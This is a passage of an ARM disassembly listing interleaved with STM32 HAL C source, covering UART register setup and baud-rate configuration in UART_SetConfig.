  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_SCEN | USART_CR3_HDSEL | USART_CR3_IREN));
 8005564:	687b      	ldr	r3, [r7, #4]
 8005566:	681b      	ldr	r3, [r3, #0]
 8005568:	689a      	ldr	r2, [r3, #8]
 800556a:	687b      	ldr	r3, [r7, #4]
 800556c:	681b      	ldr	r3, [r3, #0]
 800556e:	f022 022a 	bic.w	r2, r2, #42	; 0x2a
 8005572:	609a      	str	r2, [r3, #8]

  __HAL_UART_ENABLE(huart);
 8005574:	687b      	ldr	r3, [r7, #4]
 8005576:	681b      	ldr	r3, [r3, #0]
 8005578:	681a      	ldr	r2, [r3, #0]
 800557a:	687b      	ldr	r3, [r7, #4]
 800557c:	681b      	ldr	r3, [r3, #0]
 800557e:	f042 0201 	orr.w	r2, r2, #1
 8005582:	601a      	str	r2, [r3, #0]

  /* TEACK and/or REACK to check before moving huart->gState and huart->RxState to Ready */
  return (UART_CheckIdleState(huart));
 8005584:	6878      	ldr	r0, [r7, #4]
 8005586:	f000 fad3 	bl	8005b30 <UART_CheckIdleState>
 800558a:	4603      	mov	r3, r0
}
 800558c:	4618      	mov	r0, r3
 800558e:	3708      	adds	r7, #8
 8005590:	46bd      	mov	sp, r7
 8005592:	bd80      	pop	{r7, pc}

08005594 <UART_SetConfig>:
  * @brief Configure the UART peripheral.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_SetConfig(UART_HandleTypeDef *huart)
{
 8005594:	e92d 4fb0 	stmdb	sp!, {r4, r5, r7, r8, r9, sl, fp, lr}
 8005598:	b08a      	sub	sp, #40	; 0x28
 800559a:	af00      	add	r7, sp, #0
 800559c:	60f8      	str	r0, [r7, #12]
  uint32_t tmpreg;
  uint16_t brrtemp;
  UART_ClockSourceTypeDef clocksource;
  uint32_t usartdiv;
  HAL_StatusTypeDef ret               = HAL_OK;
 800559e:	2300      	movs	r3, #0
 80055a0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  *  the UART Word Length, Parity, Mode and oversampling:
  *  set the M bits according to huart->Init.WordLength value
  *  set PCE and PS bits according to huart->Init.Parity value
  *  set TE and RE bits according to huart->Init.Mode value
  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 80055a4:	68fb      	ldr	r3, [r7, #12]
 80055a6:	689a      	ldr	r2, [r3, #8]
 80055a8:	68fb      	ldr	r3, [r7, #12]
 80055aa:	691b      	ldr	r3, [r3, #16]
 80055ac:	431a      	orrs	r2, r3
 80055ae:	68fb      	ldr	r3, [r7, #12]
 80055b0:	695b      	ldr	r3, [r3, #20]
 80055b2:	431a      	orrs	r2, r3
 80055b4:	68fb      	ldr	r3, [r7, #12]
 80055b6:	69db      	ldr	r3, [r3, #28]
 80055b8:	4313      	orrs	r3, r2
 80055ba:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 80055bc:	68fb      	ldr	r3, [r7, #12]
 80055be:	681b      	ldr	r3, [r3, #0]
 80055c0:	681a      	ldr	r2, [r3, #0]
 80055c2:	4bb4      	ldr	r3, [pc, #720]	; (8005894 <UART_SetConfig+0x300>)
 80055c4:	4013      	ands	r3, r2
 80055c6:	68fa      	ldr	r2, [r7, #12]
 80055c8:	6812      	ldr	r2, [r2, #0]
 80055ca:	6a79      	ldr	r1, [r7, #36]	; 0x24
 80055cc:	430b      	orrs	r3, r1
 80055ce:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 80055d0:	68fb      	ldr	r3, [r7, #12]
 80055d2:	681b      	ldr	r3, [r3, #0]
 80055d4:	685b      	ldr	r3, [r3, #4]
 80055d6:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 80055da:	68fb      	ldr	r3, [r7, #12]
 80055dc:	68da      	ldr	r2, [r3, #12]
 80055de:	68fb      	ldr	r3, [r7, #12]
 80055e0:	681b      	ldr	r3, [r3, #0]
 80055e2:	430a      	orrs	r2, r1
 80055e4:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 80055e6:	68fb      	ldr	r3, [r7, #12]
 80055e8:	699b      	ldr	r3, [r3, #24]
 80055ea:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 80055ec:	68fb      	ldr	r3, [r7, #12]
 80055ee:	681b      	ldr	r3, [r3, #0]
 80055f0:	4aa9      	ldr	r2, [pc, #676]	; (8005898 <UART_SetConfig+0x304>)
 80055f2:	4293      	cmp	r3, r2
 80055f4:	d004      	beq.n	8005600 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 80055f6:	68fb      	ldr	r3, [r7, #12]
 80055f8:	6a1b      	ldr	r3, [r3, #32]
 80055fa:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80055fc:	4313      	orrs	r3, r2
 80055fe:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 8005600:	68fb      	ldr	r3, [r7, #12]
 8005602:	681b      	ldr	r3, [r3, #0]
 8005604:	689b      	ldr	r3, [r3, #8]
 8005606:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 800560a:	68fb      	ldr	r3, [r7, #12]
 800560c:	681b      	ldr	r3, [r3, #0]
 800560e:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 8005610:	430a      	orrs	r2, r1
 8005612:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 8005614:	68fb      	ldr	r3, [r7, #12]
 8005616:	681b      	ldr	r3, [r3, #0]
 8005618:	4aa0      	ldr	r2, [pc, #640]	; (800589c <UART_SetConfig+0x308>)
 800561a:	4293      	cmp	r3, r2
 800561c:	d126      	bne.n	800566c <UART_SetConfig+0xd8>
 800561e:	4ba0      	ldr	r3, [pc, #640]	; (80058a0 <UART_SetConfig+0x30c>)
 8005620:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005624:	f003 0303 	and.w	r3, r3, #3
 8005628:	2b03      	cmp	r3, #3
 800562a:	d81b      	bhi.n	8005664 <UART_SetConfig+0xd0>
 800562c:	a201      	add	r2, pc, #4	; (adr r2, 8005634 <UART_SetConfig+0xa0>)
 800562e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005632:	bf00      	nop
 8005634:	08005645 	.word	0x08005645
 8005638:	08005655 	.word	0x08005655
 800563c:	0800564d 	.word	0x0800564d
 8005640:	0800565d 	.word	0x0800565d
 8005644:	2301      	movs	r3, #1
 8005646:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800564a:	e080      	b.n	800574e <UART_SetConfig+0x1ba>
 800564c:	2302      	movs	r3, #2
 800564e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005652:	e07c      	b.n	800574e <UART_SetConfig+0x1ba>
 8005654:	2304      	movs	r3, #4
 8005656:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800565a:	e078      	b.n	800574e <UART_SetConfig+0x1ba>
 800565c:	2308      	movs	r3, #8
 800565e:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005662:	e074      	b.n	800574e <UART_SetConfig+0x1ba>
 8005664:	2310      	movs	r3, #16
 8005666:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800566a:	e070      	b.n	800574e <UART_SetConfig+0x1ba>
 800566c:	68fb      	ldr	r3, [r7, #12]
 800566e:	681b      	ldr	r3, [r3, #0]
 8005670:	4a8c      	ldr	r2, [pc, #560]	; (80058a4 <UART_SetConfig+0x310>)
 8005672:	4293      	cmp	r3, r2
 8005674:	d138      	bne.n	80056e8 <UART_SetConfig+0x154>
 8005676:	4b8a      	ldr	r3, [pc, #552]	; (80058a0 <UART_SetConfig+0x30c>)
 8005678:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800567c:	f003 030c 	and.w	r3, r3, #12
 8005680:	2b0c      	cmp	r3, #12
 8005682:	d82d      	bhi.n	80056e0 <UART_SetConfig+0x14c>
 8005684:	a201      	add	r2, pc, #4	; (adr r2, 800568c <UART_SetConfig+0xf8>)
 8005686:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800568a:	bf00      	nop
 800568c:	080056c1 	.word	0x080056c1
 8005690:	080056e1 	.word	0x080056e1
 8005694:	080056e1 	.word	0x080056e1
 8005698:	080056e1 	.word	0x080056e1
 800569c:	080056d1 	.word	0x080056d1
 80056a0:	080056e1 	.word	0x080056e1
 80056a4:	080056e1 	.word	0x080056e1
 80056a8:	080056e1 	.word	0x080056e1
 80056ac:	080056c9 	.word	0x080056c9
 80056b0:	080056e1 	.word	0x080056e1
 80056b4:	080056e1 	.word	0x080056e1
 80056b8:	080056e1 	.word	0x080056e1
 80056bc:	080056d9 	.word	0x080056d9
 80056c0:	2300      	movs	r3, #0
 80056c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056c6:	e042      	b.n	800574e <UART_SetConfig+0x1ba>
 80056c8:	2302      	movs	r3, #2
 80056ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056ce:	e03e      	b.n	800574e <UART_SetConfig+0x1ba>
 80056d0:	2304      	movs	r3, #4
 80056d2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056d6:	e03a      	b.n	800574e <UART_SetConfig+0x1ba>
 80056d8:	2308      	movs	r3, #8
 80056da:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056de:	e036      	b.n	800574e <UART_SetConfig+0x1ba>
 80056e0:	2310      	movs	r3, #16
 80056e2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056e6:	e032      	b.n	800574e <UART_SetConfig+0x1ba>
 80056e8:	68fb      	ldr	r3, [r7, #12]
 80056ea:	681b      	ldr	r3, [r3, #0]
 80056ec:	4a6a      	ldr	r2, [pc, #424]	; (8005898 <UART_SetConfig+0x304>)
 80056ee:	4293      	cmp	r3, r2
 80056f0:	d12a      	bne.n	8005748 <UART_SetConfig+0x1b4>
 80056f2:	4b6b      	ldr	r3, [pc, #428]	; (80058a0 <UART_SetConfig+0x30c>)
 80056f4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80056f8:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 80056fc:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005700:	d01a      	beq.n	8005738 <UART_SetConfig+0x1a4>
 8005702:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 8005706:	d81b      	bhi.n	8005740 <UART_SetConfig+0x1ac>
 8005708:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 800570c:	d00c      	beq.n	8005728 <UART_SetConfig+0x194>
 800570e:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005712:	d815      	bhi.n	8005740 <UART_SetConfig+0x1ac>
 8005714:	2b00      	cmp	r3, #0
 8005716:	d003      	beq.n	8005720 <UART_SetConfig+0x18c>
 8005718:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800571c:	d008      	beq.n	8005730 <UART_SetConfig+0x19c>
 800571e:	e00f      	b.n	8005740 <UART_SetConfig+0x1ac>
 8005720:	2300      	movs	r3, #0
 8005722:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005726:	e012      	b.n	800574e <UART_SetConfig+0x1ba>
 8005728:	2302      	movs	r3, #2
 800572a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800572e:	e00e      	b.n	800574e <UART_SetConfig+0x1ba>
 8005730:	2304      	movs	r3, #4
 8005732:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005736:	e00a      	b.n	800574e <UART_SetConfig+0x1ba>
 8005738:	2308      	movs	r3, #8
 800573a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800573e:	e006      	b.n	800574e <UART_SetConfig+0x1ba>
 8005740:	2310      	movs	r3, #16
 8005742:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005746:	e002      	b.n	800574e <UART_SetConfig+0x1ba>
 8005748:	2310      	movs	r3, #16
 800574a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 800574e:	68fb      	ldr	r3, [r7, #12]
 8005750:	681b      	ldr	r3, [r3, #0]
 8005752:	4a51      	ldr	r2, [pc, #324]	; (8005898 <UART_SetConfig+0x304>)
 8005754:	4293      	cmp	r3, r2
 8005756:	d17a      	bne.n	800584e <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 8005758:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 800575c:	2b08      	cmp	r3, #8
 800575e:	d824      	bhi.n	80057aa <UART_SetConfig+0x216>
 8005760:	a201      	add	r2, pc, #4	; (adr r2, 8005768 <UART_SetConfig+0x1d4>)
 8005762:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005766:	bf00      	nop
 8005768:	0800578d 	.word	0x0800578d
 800576c:	080057ab 	.word	0x080057ab
 8005770:	08005795 	.word	0x08005795
 8005774:	080057ab 	.word	0x080057ab
 8005778:	0800579b 	.word	0x0800579b
 800577c:	080057ab 	.word	0x080057ab
 8005780:	080057ab 	.word	0x080057ab
 8005784:	080057ab 	.word	0x080057ab
 8005788:	080057a3 	.word	0x080057a3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800578c:	f7fe fe6c 	bl	8004468 <HAL_RCC_GetPCLK1Freq>
 8005790:	61f8      	str	r0, [r7, #28]
        break;
 8005792:	e010      	b.n	80057b6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005794:	4b44      	ldr	r3, [pc, #272]	; (80058a8 <UART_SetConfig+0x314>)
 8005796:	61fb      	str	r3, [r7, #28]
        break;
 8005798:	e00d      	b.n	80057b6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800579a:	f7fe fdcd 	bl	8004338 <HAL_RCC_GetSysClockFreq>
 800579e:	61f8      	str	r0, [r7, #28]
        break;
 80057a0:	e009      	b.n	80057b6 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80057a2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80057a6:	61fb      	str	r3, [r7, #28]
        break;
 80057a8:	e005      	b.n	80057b6 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 80057aa:	2300      	movs	r3, #0
 80057ac:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80057ae:	2301      	movs	r3, #1
 80057b0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80057b4:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 80057b6:	69fb      	ldr	r3, [r7, #28]
 80057b8:	2b00      	cmp	r3, #0
 80057ba:	f000 8107 	beq.w	80059cc <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80057be:	68fb      	ldr	r3, [r7, #12]
 80057c0:	685a      	ldr	r2, [r3, #4]
 80057c2:	4613      	mov	r3, r2
 80057c4:	005b      	lsls	r3, r3, #1
 80057c6:	4413      	add	r3, r2
 80057c8:	69fa      	ldr	r2, [r7, #28]
 80057ca:	429a      	cmp	r2, r3
 80057cc:	d305      	bcc.n	80057da <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 80057ce:	68fb      	ldr	r3, [r7, #12]
 80057d0:	685b      	ldr	r3, [r3, #4]
 80057d2:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 80057d4:	69fa      	ldr	r2, [r7, #28]
 80057d6:	429a      	cmp	r2, r3
 80057d8:	d903      	bls.n	80057e2 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 80057da:	2301      	movs	r3, #1
 80057dc:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80057e0:	e0f4      	b.n	80059cc <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 80057e2:	69fb      	ldr	r3, [r7, #28]
 80057e4:	2200      	movs	r2, #0
 80057e6:	461c      	mov	r4, r3
 80057e8:	4615      	mov	r5, r2
 80057ea:	f04f 0200 	mov.w	r2, #0
 80057ee:	f04f 0300 	mov.w	r3, #0
 80057f2:	022b      	lsls	r3, r5, #8
 80057f4:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 80057f8:	0222      	lsls	r2, r4, #8
 80057fa:	68f9      	ldr	r1, [r7, #12]
 80057fc:	6849      	ldr	r1, [r1, #4]
 80057fe:	0849      	lsrs	r1, r1, #1
 8005800:	2000      	movs	r0, #0
 8005802:	4688      	mov	r8, r1
 8005804:	4681      	mov	r9, r0
 8005806:	eb12 0a08 	adds.w	sl, r2, r8
 800580a:	eb43 0b09 	adc.w	fp, r3, r9
 800580e:	68fb      	ldr	r3, [r7, #12]
 8005810:	685b      	ldr	r3, [r3, #4]
 8005812:	2200      	movs	r2, #0
 8005814:	603b      	str	r3, [r7, #0]
 8005816:	607a      	str	r2, [r7, #4]
 8005818:	e9d7 2300 	ldrd	r2, r3, [r7]
 800581c:	4650      	mov	r0, sl
 800581e:	4659      	mov	r1, fp
 8005820:	f7fa fcdc 	bl	80001dc <__aeabi_uldivmod>
 8005824:	4602      	mov	r2, r0
 8005826:	460b      	mov	r3, r1
 8005828:	4613      	mov	r3, r2
 800582a:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 800582c:	69bb      	ldr	r3, [r7, #24]
 800582e:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 8005832:	d308      	bcc.n	8005846 <UART_SetConfig+0x2b2>
 8005834:	69bb      	ldr	r3, [r7, #24]
 8005836:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 800583a:	d204      	bcs.n	8005846 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 800583c:	68fb      	ldr	r3, [r7, #12]
 800583e:	681b      	ldr	r3, [r3, #0]
 8005840:	69ba      	ldr	r2, [r7, #24]
 8005842:	60da      	str	r2, [r3, #12]
 8005844:	e0c2      	b.n	80059cc <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 8005846:	2301      	movs	r3, #1
 8005848:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 800584c:	e0be      	b.n	80059cc <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 800584e:	68fb      	ldr	r3, [r7, #12]
 8005850:	69db      	ldr	r3, [r3, #28]
 8005852:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 8005856:	d16a      	bne.n	800592e <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 8005858:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 800585c:	2b08      	cmp	r3, #8
 800585e:	d834      	bhi.n	80058ca <UART_SetConfig+0x336>
 8005860:	a201      	add	r2, pc, #4	; (adr r2, 8005868 <UART_SetConfig+0x2d4>)
 8005862:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005866:	bf00      	nop
 8005868:	0800588d 	.word	0x0800588d
 800586c:	080058ad 	.word	0x080058ad
 8005870:	080058b5 	.word	0x080058b5
 8005874:	080058cb 	.word	0x080058cb
 8005878:	080058bb 	.word	0x080058bb
 800587c:	080058cb 	.word	0x080058cb
 8005880:	080058cb 	.word	0x080058cb
 8005884:	080058cb 	.word	0x080058cb
 8005888:	080058c3 	.word	0x080058c3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800588c:	f7fe fdec 	bl	8004468 <HAL_RCC_GetPCLK1Freq>
 8005890:	61f8      	str	r0, [r7, #28]
        break;
 8005892:	e020      	b.n	80058d6 <UART_SetConfig+0x342>
 8005894:	efff69f3 	.word	0xefff69f3
 8005898:	40008000 	.word	0x40008000
 800589c:	40013800 	.word	0x40013800
 80058a0:	40021000 	.word	0x40021000
 80058a4:	40004400 	.word	0x40004400
 80058a8:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 80058ac:	f7fe fdf2 	bl	8004494 <HAL_RCC_GetPCLK2Freq>
 80058b0:	61f8      	str	r0, [r7, #28]
        break;
 80058b2:	e010      	b.n	80058d6 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 80058b4:	4b4c      	ldr	r3, [pc, #304]	; (80059e8 <UART_SetConfig+0x454>)
 80058b6:	61fb      	str	r3, [r7, #28]
        break;
 80058b8:	e00d      	b.n	80058d6 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 80058ba:	f7fe fd3d 	bl	8004338 <HAL_RCC_GetSysClockFreq>
 80058be:	61f8      	str	r0, [r7, #28]
        break;
 80058c0:	e009      	b.n	80058d6 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 80058c2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 80058c6:	61fb      	str	r3, [r7, #28]
        break;
 80058c8:	e005      	b.n	80058d6 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 80058ca:	2300      	movs	r3, #0
 80058cc:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 80058ce:	2301      	movs	r3, #1
 80058d0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 80058d4:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 80058d6:	69fb      	ldr	r3, [r7, #28]
 80058d8:	2b00      	cmp	r3, #0
 80058da:	d077      	beq.n	80059cc <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 80058dc:	69fb      	ldr	r3, [r7, #28]
 80058de:	005a      	lsls	r2, r3, #1
 80058e0:	68fb      	ldr	r3, [r7, #12]
 80058e2:	685b      	ldr	r3, [r3, #4]
 80058e4:	085b      	lsrs	r3, r3, #1
 80058e6:	441a      	add	r2, r3
 80058e8:	68fb      	ldr	r3, [r7, #12]
 80058ea:	685b      	ldr	r3, [r3, #4]
 80058ec:	fbb2 f3f3 	udiv	r3, r2, r3
 80058f0:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 80058f2:	69bb      	ldr	r3, [r7, #24]
 80058f4:	2b0f      	cmp	r3, #15
 80058f6:	d916      	bls.n	8005926 <UART_SetConfig+0x392>
 80058f8:	69bb      	ldr	r3, [r7, #24]
 80058fa:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 80058fe:	d212      	bcs.n	8005926 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005900:	69bb      	ldr	r3, [r7, #24]
 8005902:	b29b      	uxth	r3, r3
 8005904:	f023 030f 	bic.w	r3, r3, #15
 8005908:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 800590a:	69bb      	ldr	r3, [r7, #24]
 800590c:	085b      	lsrs	r3, r3, #1
 800590e:	b29b      	uxth	r3, r3
 8005910:	f003 0307 	and.w	r3, r3, #7
 8005914:	b29a      	uxth	r2, r3
 8005916:	8afb      	ldrh	r3, [r7, #22]
 8005918:	4313      	orrs	r3, r2
 800591a:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 800591c:	68fb      	ldr	r3, [r7, #12]
 800591e:	681b      	ldr	r3, [r3, #0]
 8005920:	8afa      	ldrh	r2, [r7, #22]
 8005922:	60da      	str	r2, [r3, #12]
 8005924:	e052      	b.n	80059cc <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005926:	2301      	movs	r3, #1
 8005928:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 800592c:	e04e      	b.n	80059cc <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 800592e:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005932:	2b08      	cmp	r3, #8
 8005934:	d827      	bhi.n	8005986 <UART_SetConfig+0x3f2>
 8005936:	a201      	add	r2, pc, #4	; (adr r2, 800593c <UART_SetConfig+0x3a8>)
 8005938:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800593c:	08005961 	.word	0x08005961
 8005940:	08005969 	.word	0x08005969
 8005944:	08005971 	.word	0x08005971
 8005948:	08005987 	.word	0x08005987
 800594c:	08005977 	.word	0x08005977
 8005950:	08005987 	.word	0x08005987
 8005954:	08005987 	.word	0x08005987
 8005958:	08005987 	.word	0x08005987
 800595c:	0800597f 	.word	0x0800597f
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005960:	f7fe fd82 	bl	8004468 <HAL_RCC_GetPCLK1Freq>
 8005964:	61f8      	str	r0, [r7, #28]
        break;
 8005966:	e014      	b.n	8005992 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005968:	f7fe fd94 	bl	8004494 <HAL_RCC_GetPCLK2Freq>
 800596c:	61f8      	str	r0, [r7, #28]
        break;
 800596e:	e010      	b.n	8005992 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005970:	4b1d      	ldr	r3, [pc, #116]	; (80059e8 <UART_SetConfig+0x454>)
 8005972:	61fb      	str	r3, [r7, #28]
        break;
 8005974:	e00d      	b.n	8005992 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005976:	f7fe fcdf 	bl	8004338 <HAL_RCC_GetSysClockFreq>
 800597a:	61f8      	str	r0, [r7, #28]
        break;
 800597c:	e009      	b.n	8005992 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800597e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005982:	61fb      	str	r3, [r7, #28]
        break;
 8005984:	e005      	b.n	8005992 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005986:	2300      	movs	r3, #0
 8005988:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800598a:	2301      	movs	r3, #1
 800598c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005990:	bf00      	nop
    }

    if (pclk != 0U)
 8005992:	69fb      	ldr	r3, [r7, #28]
 8005994:	2b00      	cmp	r3, #0
 8005996:	d019      	beq.n	80059cc <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005998:	68fb      	ldr	r3, [r7, #12]
 800599a:	685b      	ldr	r3, [r3, #4]
 800599c:	085a      	lsrs	r2, r3, #1
 800599e:	69fb      	ldr	r3, [r7, #28]
 80059a0:	441a      	add	r2, r3
 80059a2:	68fb      	ldr	r3, [r7, #12]
 80059a4:	685b      	ldr	r3, [r3, #4]
 80059a6:	fbb2 f3f3 	udiv	r3, r2, r3
 80059aa:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
